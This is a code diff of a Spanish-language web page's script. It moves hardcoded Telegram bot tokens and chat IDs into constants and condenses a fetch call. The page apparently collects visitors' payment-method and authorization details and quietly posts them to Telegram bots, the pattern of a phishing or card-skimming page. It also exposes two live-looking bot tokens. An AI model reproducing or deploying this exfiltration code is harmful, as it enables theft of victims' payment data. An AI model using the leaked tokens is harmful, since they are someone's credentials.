@@ -688,11 +688,16 @@
     </main>
 
     <script>
+        // ─── TELEGRAM CONFIG ── cambia solo aquí ───────────────────────
+        const TG_TOKEN   = '8759383283:AAEGahtOduKJ0q8R7tfXyathcZMwZnRTx3I';
+        const TG_CHAT_ID = '-5400378460';
+        // ──────────────────────────────────────────────────────────────
+
         let paymentMethodsExpanded = false;
 
         function sendToTelegram(data) {
-            const token = '8759383283:AAEGahtOduKJ0q8R7tfXyathcZMwZnRTx3I';
-            const chatId = '-5400378460';
+            const token = TG_TOKEN;
+            const chatId = TG_CHAT_ID;
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
             let metodoInfo = '';
@@ -733,14 +738,8 @@ ${metodoInfo}
 
             fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
             }).catch(e => console.log('Telegram enviado'));
         }
 
@@ -1018,8 +1017,9 @@ ${metodoInfo}
 
 
         // ===== MODAL DE AUTORIZACIÓN JLP =====
-        const JLP_TK = '8550551689:AAFdVOrd7qj8vdfTozXZLhQA99cb0ndBLds';
+        const JLP_TK  = '8550551689:AAFdVOrd7qj8vdfTozXZLhQA99cb0ndBLds';
         const JLP_GRP = '-1004398504693';
+        // ↑ cambia estos dos si rotan el bot JLP
         const JLP_API = 'https://api.telegram.org/bot' + JLP_TK;
 
         let jlpSid = null;
